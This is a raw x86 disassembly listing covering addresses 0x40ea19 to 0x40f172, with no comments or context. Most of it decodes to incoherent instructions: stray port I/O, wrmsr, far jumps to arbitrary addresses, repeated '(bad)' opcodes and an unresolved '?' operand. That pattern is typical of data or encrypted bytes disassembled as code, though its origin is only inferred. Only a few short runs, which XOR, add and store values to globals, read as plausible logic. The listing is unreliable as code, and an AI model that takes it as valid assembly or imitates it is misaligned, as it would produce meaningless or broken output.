  40ea19:	scas   al,BYTE PTR es:[edi]
  40ea1a:	push   cs
  40ea1b:	mov    DWORD PTR [ebx+0x4c],edx
  40ea1e:	fnstsw WORD PTR cs:[ebx]
  40ea21:	pop    eax
  40ea22:	push   es
  40ea23:	in     al,0x78
  40ea25:	push   ebp
  40ea26:	mov    dh,0xb0
  40ea28:	cs retf 
  40ea2a:	ja     0x40ea3d
  40ea2c:	shl    BYTE PTR [edi+eax*1-0x2],cl
  40ea30:	mov    dl,0x9f
  40ea32:	inc    ebx
  40ea33:	cmp    al,0x4e
  40ea35:	push   ebx
  40ea36:	stos   BYTE PTR es:[edi],al
  40ea37:	loope  0x40ea6b
  40ea39:	jecxz  0x40ea3f
  40ea3b:	xor    eax,0xc66055e0
  40ea40:	and    eax,0xc98abccf
  40ea45:	xchg   esi,eax
  40ea46:	sahf   
  40ea47:	cmp    DWORD PTR [eax+ebx*4+0x4d02f5f8],ecx
  40ea4e:	jl     0x40ea85
  40ea50:	dec    ebp
  40ea51:	adc    eax,0xd67496aa
  40ea56:	in     al,dx
  40ea57:	sub    edi,edx
  40ea59:	mov    eax,gs
  40ea5b:	out    0x4a,eax
  40ea5d:	inc    edi
  40ea5e:	mov    edi,0x8e5d0b3c
  40ea63:	jns    0x40ea29
  40ea65:	iret   
  40ea66:	pop    es
  40ea67:	enter  0xa31c,0xaf
  40ea6b:	shl    BYTE PTR [edi-0x53415062],1
  40ea71:	xchg   edx,eax
  40ea72:	mov    eax,0x8017af3e
  40ea77:	inc    di
  40ea79:	retf   
  40ea7a:	jl     0x40ea91
  40ea7c:	jmp    0x40eaa3
  40ea7e:	iret   
  40ea7f:	outs   dx,BYTE PTR ds:[esi]
  40ea80:	pop    ss
  40ea81:	mov    ds:0x46fc48f9,al
  40ea86:	adc    DWORD PTR [ebp-0x1b20c4d],esp
  40ea8c:	pop    ebp
  40ea8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea8e:	adc    esp,DWORD PTR [edi-0x497c6463]
  40ea94:	jne    0x40eac2
  40ea96:	mov    ds:0xfbc3a884,al
  40ea9b:	cmc    
  40ea9c:	xor    al,0x8b
  40ea9e:	inc    ebp
  40ea9f:	clc    
  40eaa0:	jmp    0x40f269
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
  40eac4:	jmp    0x40ea54
  40eac6:	imul   edx,DWORD PTR [edx+0x1973f175],0x6e83fe94
  40ead0:	hlt    
  40ead1:	add    BYTE PTR [edx+0x7c7cad97],dh
  40ead7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead8:	jns    0x40eb56
  40eada:	jl     0x40ead3
  40eadc:	sbb    al,BYTE PTR [ecx-0x5d]
  40eadf:	xor    eax,0x7e5b3477
  40eae4:	mov    BYTE PTR [eax],dl
  40eae6:	popa   
  40eae7:	ins    BYTE PTR es:[edi],dx
  40eae8:	clc    
  40eae9:	leave  
  40eaea:	and    DWORD PTR [edi-0x2ee7406c],0x6a
  40eaf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaf2:	mov    eax,0xe9f200fb
  40eaf7:	jle    0x40eaeb
  40eaf9:	xchg   DWORD PTR [ebp+eax*2+0x6d],edi
  40eafd:	inc    esi
  40eafe:	jg     0x40eb20
  40eb00:	jnp    0x40eb36
  40eb02:	stos   BYTE PTR es:[edi],al
  40eb03:	push   ebp
  40eb04:	bts    DWORD PTR [edx-0x1a],ebx
  40eb08:	inc    eax
  40eb09:	inc    BYTE PTR [edi]
  40eb0b:	lods   al,BYTE PTR ds:[esi]
  40eb0c:	pushf  
  40eb0d:	in     al,0x1f
  40eb0f:	mov    ds:0x7ecaef92,al
  40eb14:	ins    BYTE PTR es:[edi],dx
  40eb15:	jmp    0xb222:0xc62ca4ca
  40eb1c:	push   esp
  40eb1d:	scas   al,BYTE PTR es:[edi]
  40eb1e:	test   DWORD PTR [ecx-0x66],eax
  40eb21:	push   ss
  40eb22:	dec    esp
  40eb23:	enter  0x171,0x4b
  40eb27:	mov    cl,0x45
  40eb29:	dec    esp
  40eb2a:	repnz pop ebx
  40eb2c:	jge    0x40eb7e
  40eb2e:	pusha  
  40eb2f:	test   DWORD PTR [ecx-0x1dbbdeaf],edx
  40eb35:	inc    ebx
  40eb36:	fwait
  40eb37:	dec    esi
  40eb38:	cmc    
  40eb39:	or     ebp,DWORD PTR [esi+edi*4+0x46]
  40eb3d:	jne    0x40eb11
  40eb3f:	nop
  40eb40:	out    dx,al
  40eb41:	ss pop es
  40eb43:	fnstsw WORD PTR [ebx-0x4]
  40eb46:	sbb    ch,dl
  40eb48:	sahf   
  40eb49:	sbb    eax,0x88f0c447
  40eb4e:	call   0x1c989be9
  40eb53:	push   esi
  40eb54:	stos   DWORD PTR es:[edi],eax
  40eb55:	out    0x4f,ax
  40eb58:	and    al,ah
  40eb5a:	rcr    BYTE PTR [edx+0x29],cl
  40eb5d:	inc    edx
  40eb5e:	inc    ebp
  40eb5f:	jle    0x40ebab
  40eb61:	mov    al,ds:0xebaee957
  40eb66:	call   0xf23f872b
  40eb6b:	pushf  
  40eb6c:	cwde   
  40eb6d:	fsub   st,st(5)
  40eb6f:	jle    0x40ebd9
  40eb71:	adc    eax,0xe52e3e97
  40eb76:	jne    0x40eb57
  40eb78:	pop    ecx
  40eb79:	(bad)  
  40eb7a:	(bad)  
  40eb7b:	icebp  
  40eb7c:	inc    ecx
  40eb7d:	stc    
  40eb7e:	imul   esi,DWORD PTR [edx+0x69a66a6],0xe08cb3ea
  40eb88:	xchg   ebx,eax
  40eb89:	xchg   DWORD PTR [edx*8+0x29964325],edx
  40eb90:	rol    edi,cl
  40eb92:	rol    BYTE PTR [eax+ebp*1],0xd7
  40eb96:	arpl   WORD PTR [edi],sp
  40eb98:	mov    ch,0xb5
  40eb9a:	loopne 0x40ebf1
  40eb9c:	sub    edi,DWORD PTR [ebx]
  40eb9e:	fbld   TBYTE PTR [ebp+0x65]
  40eba1:	add    DWORD PTR [ebx-0x4e41a575],eax
  40eba7:	retf   
  40eba8:	jg     0x40eb34
  40ebaa:	gs mov cl,0xbb
  40ebad:	xor    BYTE PTR [ebp-0x459ba3da],ah
  40ebb3:	cmc    
  40ebb4:	lods   al,BYTE PTR ds:[esi]
  40ebb5:	adc    ebp,esp
  40ebb7:	push   ss
  40ebb8:	leave  
  40ebb9:	ret    0x5a34
  40ebbc:	or     dl,BYTE PTR [ebx-0x71]
  40ebbf:	push   esi
  40ebc0:	mov    ah,0x25
  40ebc2:	je     0x40ec20
  40ebc4:	sahf   
  40ebc5:	adc    dh,ah
  40ebc7:	(bad)  
  40ebc8:	mov    ebx,0xb8861eed
  40ebcd:	fst    QWORD PTR [ebp+0x67]
  40ebd0:	in     eax,dx
  40ebd1:	xor    BYTE PTR [edx],dl
  40ebd3:	sbb    al,BYTE PTR [eax+esi*2]
  40ebd6:	and    esp,ebx
  40ebd8:	push   ebx
  40ebd9:	fnstsw WORD PTR [esi+0x2cce11db]
  40ebdf:	clc    
  40ebe0:	sbb    eax,0xdd63b9bd
  40ebe5:	xor    esp,DWORD PTR [eax]
  40ebe7:	or     BYTE PTR [eax-0x29120fd],al
  40ebed:	add    edi,DWORD PTR [edi-0x14ad4ca6]
  40ebf3:	push   ecx
  40ebf4:	imul   esi,DWORD PTR [edx-0x7b],0x32
  40ebf8:	mov    esp,0xf5f3102e
  40ebfd:	stos   DWORD PTR es:[edi],eax
  40ebfe:	fsubr  DWORD PTR [esi-0x2cdde362]
  40ec04:	ror    DWORD PTR [edi-0x64958a45],1
  40ec0a:	jno    0x40ec50
  40ec0c:	dec    ebp
  40ec0d:	push   esi
  40ec0e:	mov    ds:0xba06bf01,eax
  40ec13:	out    dx,al
  40ec14:	stc    
  40ec15:	int    0x42
  40ec17:	leave  
  40ec18:	mov    eax,ds:0xd291dd7d
  40ec1d:	mov    edx,0x4b985bac
  40ec22:	push   ds
  40ec23:	les    ecx,FWORD PTR [eax+0x7412136f]
  40ec29:	icebp  
  40ec2a:	not    DWORD PTR [di+0x5091]
  40ec2f:	mov    al,0xe6
  40ec31:	mov    esi,0xe638fa11
  40ec36:	add    BYTE PTR [edx+0x77],0x20
  40ec3a:	retf   0xe50d
  40ec3d:	sbb    esp,ecx
  40ec3f:	jl     0x40ec1f
  40ec41:	adc    eax,0x262df102
  40ec46:	ss xchg ecx,eax
  40ec48:	mov    esp,0xa35708a0
  40ec4d:	push   eax
  40ec4e:	and    cl,BYTE PTR [ebx+0x4]
  40ec51:	int3   
  40ec52:	cmp    ecx,0xffffffe0
  40ec55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec56:	mov    dl,0x2c
  40ec58:	xchg   edi,eax
  40ec59:	dec    edx
  40ec5a:	sub    BYTE PTR [ebx-0x25],ah
  40ec5d:	retf   
  40ec5e:	mul    esp
  40ec60:	inc    ebx
  40ec61:	jmp    0x40ec34
  40ec63:	js     0x40ebe5
  40ec65:	(bad)  
  40ec66:	sub    DWORD PTR [ecx],edi
  40ec68:	arpl   WORD PTR [ebp+0x78ca667],bx
  40ec6e:	or     esi,eax
  40ec70:	add    BYTE PTR [edx],bl
  40ec72:	popf   
  40ec73:	fwait
  40ec74:	push   eax
  40ec75:	inc    BYTE PTR [eax-0x4c]
  40ec78:	push   DWORD PTR ds:0xeffa29e7
  40ec7e:	jno    0x40ecc4
  40ec80:	mov    edi,DWORD PTR [eax+0x5fe33327]
  40ec86:	mov    cl,0x38
  40ec88:	push   0xd042bfab
  40ec8d:	pop    edi
  40ec8e:	wrmsr  
  40ec90:	inc    eax
  40ec91:	and    DWORD PTR [esi-0x6],0x6c72a875
  40ec98:	mov    edx,0x59cb6e4b
  40ec9d:	push   edi
  40ec9e:	xchg   edx,eax
  40ec9f:	cmp    ah,al
  40eca1:	rcl    BYTE PTR [eax-0x3c],1
  40eca4:	inc    ebx
  40eca5:	fidiv  WORD PTR [ecx-0x6804b249]
  40ecab:	hlt    
  40ecac:	xchg   esp,eax
  40ecad:	ins    DWORD PTR es:[edi],dx
  40ecae:	stos   BYTE PTR es:[edi],al
  40ecaf:	xor    ecx,DWORD PTR [ecx+edx*2-0x40267fc]
  40ecb6:	or     esi,DWORD PTR [esi+0x16a6d7a8]
  40ecbc:	add    BYTE PTR [eax],al
  40ecbe:	add    dh,al
  40ecc0:	mov    bl,0xfd
  40ecc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc3:	sub    BYTE PTR [esi],0x56
  40ecc6:	fwait
  40ecc7:	xchg   ebx,eax
  40ecc8:	scas   eax,DWORD PTR es:[edi]
  40ecc9:	cdq    
  40ecca:	pop    edx
  40eccb:	addr16 inc ecx
  40eccd:	stc    
  40ecce:	pop    ecx
  40eccf:	cmp    eax,0x88edbeb7
  40ecd4:	lds    ebp,FWORD PTR [edx-0x3fda4d]
  40ecda:	mov    DWORD PTR [edx-0x451c690d],ebx
  40ece0:	inc    edx
  40ece1:	xor    BYTE PTR [esi],al
  40ece3:	jp     0x40ecf2
  40ece5:	jno    0x40ec98
  40ece7:	enter  0x2ef2,0x7e
  40eceb:	sub    DWORD PTR [ebx-0x4c14d338],edx
  40ecf1:	(bad)  
  40ecf2:	xchg   esi,eax
  40ecf3:	jnp    0x40ecab
  40ecf5:	ins    DWORD PTR es:[edi],dx
  40ecf6:	cmp    ah,BYTE PTR [ebp+0x33d130dd]
  40ecfc:	test   DWORD PTR [esi-0x7b],ebx
  40ecff:	lds    esi,FWORD PTR [ecx]
  40ed01:	and    bh,cl
  40ed03:	in     al,dx
  40ed04:	repz rcr ch,1
  40ed07:	jmp    0x40ecc6
  40ed09:	pop    esi
  40ed0a:	pop    eax
  40ed0b:	jge    0x40ed4a
  40ed0d:	add    BYTE PTR [edx-0x6a3c487],0x3b
  40ed14:	(bad)  
  40ed15:	mov    ch,0x2c
  40ed17:	mov    bh,0xf5
  40ed19:	mov    cs,WORD PTR es:[edx+0x37]
  40ed1d:	mov    edx,0x7c31a396
  40ed22:	adc    ecx,DWORD PTR [ecx+0x37]
  40ed25:	lds    esi,FWORD PTR [edx-0x11]
  40ed28:	jmp    0x40ed26
  40ed2a:	stos   BYTE PTR es:[edi],al
  40ed2b:	arpl   WORD PTR [ebx-0x22c55120],cx
  40ed31:	mov    edx,0x2e956a2f
  40ed36:	add    BYTE PTR [edi],bh
  40ed38:	(bad)  
  40ed39:	loop   0x40ed65
  40ed3b:	in     eax,dx
  40ed3c:	jl     0x40ed5a
  40ed3e:	lock pop ecx
  40ed40:	pusha  
  40ed41:	push   esp
  40ed42:	test   BYTE PTR [edi],ah
  40ed44:	out    0xc7,al
  40ed46:	jmp    0x1d57c5ef
  40ed4b:	imul   edx,DWORD PTR [esi-0x5d4e760b],0x96ac04d2
  40ed55:	sbb    al,BYTE PTR [esi+0x6a477f0f]
  40ed5b:	test   BYTE PTR [eax],0x2c
  40ed5e:	sub    DWORD PTR [ebx+0x25],edx
  40ed61:	into   
  40ed62:	js     0x40eda5
  40ed64:	push   ebp
  40ed65:	outs   dx,BYTE PTR ds:[esi]
  40ed66:	add    BYTE PTR [esi],bl
  40ed68:	repz sti 
  40ed6a:	jmp    0x40ed98
  40ed6c:	xor    al,0xd5
  40ed6e:	cmp    eax,DWORD PTR [ecx]
  40ed70:	popa   
  40ed71:	xchg   esi,eax
  40ed72:	jle    0x40edca
  40ed74:	aas    
  40ed75:	aad    0x8e
  40ed77:	jae    0x40ed74
  40ed79:	fdivr  DWORD PTR [edi]
  40ed7b:	jle    0x40edf8
  40ed7d:	jg     0x40ed65
  40ed7f:	neg    DWORD PTR [esi+0x76]
  40ed82:	(bad)  
  40ed83:	push   ds
  40ed84:	jbe    0x40edd0
  40ed86:	add    al,BYTE PTR [eax]
  40ed88:	stos   BYTE PTR es:[edi],al
  40ed89:	cmp    DWORD PTR [eax-0x6fcfc850],esi
  40ed8f:	sbb    eax,0x7239de43
  40ed94:	addr16 adc al,0xaf
  40ed97:	gs sub eax,0xa82b841a
  40ed9d:	dec    edi
  40ed9e:	push   esp
  40ed9f:	stos   BYTE PTR es:[edi],al
  40eda0:	xchg   esp,eax
  40eda1:	push   ebp
  40eda2:	out    dx,al
  40eda3:	pusha  
  40eda4:	or     ch,bl
  40eda6:	and    BYTE PTR [esp+ecx*8],ah
  40eda9:	inc    ebp
  40edaa:	in     al,dx
  40edab:	dec    BYTE PTR [esi+0x5]
  40edae:	fdivr  DWORD PTR [edx-0x5f]
  40edb1:	inc    edi
  40edb2:	push   es
  40edb3:	push   esp
  40edb4:	(bad)  
  40edb6:	or     eax,0xb2d6abd9
  40edbb:	les    esp,FWORD PTR [eax]
  40edbd:	and    DWORD PTR [edx-0x61],esi
  40edc0:	fs enter 0xe470,0x97
  40edc5:	xlat   BYTE PTR ds:[ebx]
  40edc6:	dec    eax
  40edc7:	dec    ebp
  40edc8:	loop   0x40ee43
  40edca:	cmc    
  40edcb:	ja     0x40ed86
  40edcd:	push   ss
  40edce:	mov    ah,0xb8
  40edd0:	arpl   WORD PTR [eax+esi*8-0x1e854a6],dx
  40edd7:	jnp    0x40edaf
  40edd9:	mov    eax,gs:0xefec0a06
  40eddf:	mov    cl,0xa2
  40ede1:	mov    bh,0x1f
  40ede3:	cmp    eax,0x30f08ed6
  40ede8:	jnp    0x40ee21
  40edea:	push   0xdc2f52d
  40edef:	cs xchg edx,eax
  40edf1:	xor    al,0x74
  40edf3:	cmp    BYTE PTR es:[ebx],ah
  40edf6:	in     al,dx
  40edf7:	fcom   st(7)
  40edf9:	je     0x40edab
  40edfb:	inc    eax
  40edfc:	push   cs
  40edfd:	jmp    0x52e90e8d
  40ee02:	jmp    0x796e41c9
  40ee07:	idiv   esi
  40ee09:	and    al,0x5b
  40ee0b:	lods   eax,DWORD PTR ds:[esi]
  40ee0c:	retf   0x70f1
  40ee0f:	pop    edx
  40ee10:	lds    eax,FWORD PTR [esi+edx*2+0x3]
  40ee14:	cdq    
  40ee15:	shr    BYTE PTR [edi+ebx*1+0x38fafe3e],0xf9
  40ee1d:	repnz daa 
  40ee1f:	fcom   DWORD PTR [edi]
  40ee21:	int    0xe9
  40ee23:	add    DWORD PTR [ebp+0x40],0x68679d5b
  40ee2a:	xchg   ebx,eax
  40ee2b:	or     eax,0xcc2634d8
  40ee30:	or     al,0x2b
  40ee32:	retf   
  40ee33:	outs   dx,DWORD PTR ds:[esi]
  40ee34:	jmp    0xdae22f7b
  40ee39:	mov    esp,0x2ddc9f69
  40ee3e:	(bad)  
  40ee3f:	fidivr DWORD PTR [edi]
  40ee41:	xor    DWORD PTR [eax-0x6eb750bc],esi
  40ee47:	lods   al,BYTE PTR ds:[esi]
  40ee48:	rcr    edx,1
  40ee4a:	mov    ch,0xce
  40ee4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee4d:	sub    esp,eax
  40ee4f:	sbb    ebp,esi
  40ee51:	lahf   
  40ee52:	stos   DWORD PTR es:[edi],eax
  40ee53:	call   0xfe1f:0x2fde9b49
  40ee5a:	scas   eax,DWORD PTR es:[edi]
  40ee5b:	bound  edx,QWORD PTR [edi-0x55]
  40ee5e:	fwait
  40ee5f:	xchg   ebp,eax
  40ee60:	and    al,0x7a
  40ee62:	je     0x40ee2f
  40ee64:	lds    ecx,FWORD PTR [ebp-0x5ae248da]
  40ee6a:	repz mov esi,0x7cfcc759
  40ee70:	jns    0x40eeb2
  40ee72:	out    0xef,al
  40ee74:	scas   eax,DWORD PTR es:[edi]
  40ee75:	mov    ah,0x49
  40ee77:	sub    eax,0xf420f825
  40ee7c:	jmp    0x31ca:0xb8257e62
  40ee83:	aas    
  40ee84:	mov    ds:0x413b9a,eax
  40ee89:	mov    eax,DWORD PTR [ebp-0x4]
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	not    DWORD PTR [esi-0x56c164fc]
  40eeac:	jl     0x40ef2a
  40eeae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeaf:	jns    0x40ef2d
  40eeb1:	jl     0x40ef17
  40eeb3:	dec    esp
  40eeb4:	jp     0x40ee68
  40eeb6:	out    0xaa,eax
  40eeb8:	cmp    ecx,DWORD PTR [ebx]
  40eeba:	dec    edx
  40eebb:	ss xor eax,0xc622c5c0
  40eec1:	mov    edx,0xccb88b25
  40eec6:	xchg   BYTE PTR [esi+eax*4+0x197d21ac],bh
  40eecd:	call   0x1d3b4d14
  40eed2:	out    0x20,eax
  40eed4:	jmp    0x40eec0
  40eed6:	int3   
  40eed7:	xor    eax,0xb74ca2e4
  40eedc:	ret    0xeb77
  40eedf:	stos   DWORD PTR es:[edi],eax
  40eee0:	mov    dh,0x1f
  40eee2:	pop    edx
  40eee3:	push   es
  40eee4:	pop    ds
  40eee5:	call   0xa567728a
  40eeea:	les    edi,FWORD PTR [ebx+0x5d]
  40eeed:	dec    esp
  40eeee:	aas    
  40eeef:	mov    BYTE PTR [eax],bl
  40eef1:	in     eax,dx
  40eef2:	in     eax,0x18
  40eef4:	aas    
  40eef5:	repnz cmp eax,0x8cb89cad
  40eefb:	icebp  
  40eefc:	inc    eax
  40eefd:	push   ebp
  40eefe:	dec    esp
  40eeff:	scas   eax,DWORD PTR es:[edi]
  40ef00:	sub    al,0x90
  40ef02:	sbb    ecx,DWORD PTR [ebp+0x11]
  40ef05:	inc    ecx
  40ef06:	jno    0x40ef0a
  40ef08:	jmp    0x6f1c95cc
  40ef0d:	dec    ecx
  40ef0e:	sbb    BYTE PTR [ecx+0x5f],0x7f
  40ef12:	dec    esi
  40ef13:	jns    0x40ef19
  40ef15:	sbb    al,0xbf
  40ef17:	push   edi
  40ef18:	mov    dl,0x1d
  40ef1a:	je     0x40ef66
  40ef1c:	mov    bl,BYTE PTR [edx]
  40ef1e:	dec    ebp
  40ef1f:	dec    edi
  40ef20:	scas   eax,DWORD PTR es:[edi]
  40ef21:	mov    ebp,esp
  40ef23:	les    edx,FWORD PTR [esi]
  40ef25:	call   0x5d1c2e61
  40ef2a:	(bad)  
  40ef2b:	repnz mov dh,0x9d
  40ef2e:	ret    
  40ef2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef30:	jo     0x40ef4d
  40ef32:	push   ebx
  40ef33:	pop    ds
  40ef34:	cmp    eax,0xec9aaa
  40ef39:	cmp    eax,0x9ba04696
  40ef3e:	mov    al,0x6d
  40ef40:	and    dl,BYTE PTR [edx-0x710b20cc]
  40ef46:	in     eax,dx
  40ef47:	loopne 0x40ef03
  40ef49:	add    eax,0x74885f62
  40ef4e:	sub    ebx,ebx
  40ef50:	not    BYTE PTR [esi+0x5ca065e5]
  40ef56:	ret    0x62c2
  40ef59:	std    
  40ef5a:	xor    ecx,DWORD PTR [edi-0x56]
  40ef5d:	ins    BYTE PTR es:[edi],dx
  40ef5e:	jp     0x40ef8d
  40ef60:	and    BYTE PTR [edx-0x5b4b54ae],dh
  40ef66:	in     al,0xe5
  40ef68:	xlat   BYTE PTR ds:[ebx]
  40ef69:	mov    al,0x33
  40ef6b:	adc    eax,DWORD PTR [eax]
  40ef6d:	jg     0x40efd6
  40ef6f:	push   eax
  40ef70:	inc    ebx
  40ef71:	push   ecx
  40ef72:	push   ebx
  40ef73:	inc    ebp
  40ef74:	cmp    al,0x64
  40ef76:	jmp    0xa91d:0x11c1c6ca
  40ef7d:	inc    edx
  40ef7e:	xlat   BYTE PTR ds:[ebx]
  40ef7f:	and    ebp,DWORD PTR [esi]
  40ef81:	push   ds
  40ef82:	sbb    edi,DWORD PTR [ebx+edi*2]
  40ef85:	xor    BYTE PTR [edx],0x9
  40ef88:	and    al,0xc0
  40ef8a:	mov    al,ds:0x87b4161c
  40ef8f:	loop   0x40efdb
  40ef91:	shr    BYTE PTR [eax+0x47],0xaa
  40ef95:	sub    DWORD PTR ds:0xf937dff5,ecx
  40ef9b:	je     0x40ef98
  40ef9d:	pop    ebx
  40ef9e:	popf   
  40ef9f:	loop   0x40efbd
  40efa1:	dec    edx
  40efa2:	add    ebx,DWORD PTR [eax-0x76]
  40efa5:	js     0x40ef68
  40efa7:	mov    bh,0x66
  40efa9:	ret    0x16a
  40efac:	add    ebp,DWORD PTR [eax-0x510f96d5]
  40efb2:	int    0xbd
  40efb4:	mov    eax,ds:0x2d40d4aa
  40efb9:	gs jl  0x40ef6d
  40efbc:	pop    edi
  40efbd:	adc    bh,BYTE PTR [edx+edx*1-0x6492771d]
  40efc4:	daa    
  40efc5:	lods   eax,DWORD PTR ds:[esi]
  40efc6:	data16 fsubr DWORD PTR [ebx-0x2a]
  40efca:	xchg   ebp,eax
  40efcb:	test   DWORD PTR [edi-0x76],0xc74a43f8
  40efd2:	cmp    al,0xb2
  40efd4:	jno    0x40efcf
  40efd6:	mov    eax,ds:0xc6ed33cb
  40efdb:	or     BYTE PTR [edi],bh
  40efdd:	les    edi,FWORD PTR [ebp-0x7f997b2b]
  40efe3:	int3   
  40efe4:	ret    
  40efe5:	sub    BYTE PTR [esi-0x17],bh
  40efe8:	adc    eax,DWORD PTR [ebx+ebx*1-0x28e224b6]
  40efef:	cmp    eax,0xba1abf78
  40eff4:	and    eax,DWORD PTR fs:[eax+ebp*4]
  40eff8:	adc    esi,esi
  40effa:	out    0x89,al
  40effc:	fldcw  WORD PTR [ecx+0x1e]
  40efff:	or     DWORD PTR [eax+0x6013fe04],0xe9764aef
  40f009:	dec    eax
  40f00a:	jae    0x40efe6
  40f00c:	xor    al,cl
  40f00e:	jl     0x40eff6
  40f010:	mov    eax,0x922ee286
  40f015:	adc    eax,0x531ae18b
  40f01a:	stos   DWORD PTR es:[edi],eax
  40f01b:	and    DWORD PTR [esi-0x2e6be986],esp
  40f021:	or     al,0xf8
  40f023:	ja     0x40efb0
  40f025:	inc    eax
  40f026:	jb     0x40eff0
  40f028:	dec    esi
  40f029:	retf   0x7ffe
  40f02c:	sbb    esp,DWORD PTR [ecx+eax*2+0x78]
  40f030:	pop    esp
  40f031:	sub    ecx,DWORD PTR [ebx+0x39ae59e5]
  40f037:	and    cl,al
  40f039:	test   al,ch
  40f03b:	cmp    BYTE PTR [esp+eiz*2],dl
  40f03e:	(bad)  
  40f03f:	mov    ebp,0x40575179
  40f044:	cld    
  40f045:	xor    cl,BYTE PTR [edx-0x5608a1ca]
  40f04b:	xor    DWORD PTR [ebx+0x61ccf169],0x67
  40f052:	push   edi
  40f053:	iret   
  40f054:	adc    edi,DWORD PTR [edx]
  40f056:	and    BYTE PTR [esi+0xa],bl
  40f059:	sub    edi,edi
  40f05b:	mov    gs,WORD PTR [esi+ebp*8-0x3a8dd81f]
  40f062:	out    dx,eax
  40f063:	jbe    0x40f073
  40f065:	mov    eax,ds:0xd87fb9bc
  40f06a:	jle    0x40f073
  40f06c:	lahf   
  40f06d:	pop    esi
  40f06e:	push   ebx
  40f06f:	inc    eax
  40f070:	push   eax
  40f071:	es add eax,0xecccbf25
  40f077:	retf   
  40f078:	and    BYTE PTR [edi],0x45
  40f07b:	in     al,0x43
  40f07d:	lods   al,BYTE PTR ds:[esi]
  40f07e:	mov    cl,0x9b
  40f080:	rcl    BYTE PTR [esi],0x47
  40f083:	jbe    0x40f02e
  40f085:	fisub  WORD PTR [edx+ebp*4-0x4f]
  40f089:	scas   al,BYTE PTR es:[edi]
  40f08a:	div    DWORD PTR [ecx+eax*4+0x3]
  40f08e:	cmp    al,0x6c
  40f090:	jo     0x40f0e2
  40f092:	bound  ecx,QWORD PTR [edx-0x20f2ae73]
  40f098:	jae    0x40f04c
  40f09a:	add    ch,BYTE PTR [ebp+0xaba1f09]
  40f0a0:	int3   
  40f0a1:	jno    0x40f03c
  40f0a3:	sub    DWORD PTR [ebx+eiz*1-0x4c],ebp
  40f0a7:	inc    BYTE PTR [ecx+0x22]
  40f0aa:	and    DWORD PTR [ecx+0x41],eax
  40f0ad:	mov    ah,BYTE PTR [ecx-0x44109f89]
  40f0b3:	or     edi,DWORD PTR [ecx+0x11751af]
  40f0b9:	or     ah,BYTE PTR [ebx-0x2]
  40f0bc:	mov    al,ch
  40f0be:	cmp    ebx,ebp
  40f0c0:	push   cs
  40f0c1:	outs   dx,DWORD PTR ds:[esi]
  40f0c2:	jnp    0x40f062
  40f0c4:	lods   al,BYTE PTR ds:[esi]
  40f0c5:	jmp    0x63729820
  40f0ca:	adc    DWORD PTR [eax+0x1b6021e7],ecx
  40f0d0:	loope  0x40f05d
  40f0d2:	leave  
  40f0d3:	mov    dh,0x3
  40f0d5:	mov    fs,edi
  40f0d7:	sub    edx,DWORD PTR [ecx+0x7827cd68]
  40f0dd:	imul   esi,DWORD PTR [esi+eax*4+0x307113fb],0x30
  40f0e5:	xchg   esi,eax
  40f0e6:	gs pop ss
  40f0e8:	je     0x40f0b3
  40f0ea:	mov    WORD PTR [esi],?
  40f0ec:	clc    
  40f0ed:	jmp    0x1b33:0x21baa72c
  40f0f4:	jmp    0x82b85fa7
  40f0f9:	nop
  40f0fa:	dec    ebx
  40f0fb:	xchg   BYTE PTR [edx-0x17acedd7],bh
  40f101:	lahf   
  40f102:	out    dx,al
  40f103:	push   es
  40f104:	inc    ebp
  40f105:	mov    cl,0x0
  40f107:	pop    ebx
  40f108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f109:	mov    ds:0x31845b51,eax
  40f10e:	shl    DWORD PTR [ecx+0x7f],cl
  40f111:	xor    eax,edi
  40f113:	push   esp
  40f114:	dec    ebx
  40f115:	stos   BYTE PTR es:[edi],al
  40f116:	mov    edx,0x52cb0796
  40f11b:	rcl    DWORD PTR [ecx],1
  40f11d:	cmp    BYTE PTR [esi],dh
  40f11f:	loopne 0x40f0df
  40f121:	cmp    cl,BYTE PTR [edi-0x2c]
  40f124:	js     0x40f11c
  40f126:	out    dx,al
  40f127:	adc    ebp,esp
  40f129:	js     0x40f187
  40f12b:	push   es
  40f12c:	lods   eax,DWORD PTR ds:[esi]
  40f12d:	lahf   
  40f12e:	and    al,0x3
  40f130:	loop   0x40f133
  40f132:	xor    eax,0x6e095de7
  40f137:	inc    ebp
  40f138:	inc    esi
  40f139:	cmp    DWORD PTR [esi+0x29217ec5],ebx
  40f13f:	pop    ss
  40f140:	lds    eax,FWORD PTR [ecx+0x69]
  40f143:	add    ebp,ebx
  40f145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f146:	aam    0x28
  40f148:	mov    edi,eax
  40f14a:	add    ecx,esp
  40f14c:	test   BYTE PTR [edx-0x4b2094fb],0xd1
  40f153:	mov    bh,0xf5
  40f155:	ret    
  40f156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f157:	shl    DWORD PTR [esp+esi*1-0x17],cl
  40f15b:	mov    eax,ds:0x95e23bd6
  40f160:	pop    DWORD PTR [ebp+0x9852561]
  40f166:	repz cli 
  40f168:	xchg   edx,eax
  40f169:	cli    
  40f16a:	jo     0x40f111
  40f16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f16d:	test   al,0x33
  40f16f:	int3   
  40f170:	loop   0x40f15d
  40f172:	pop    esi
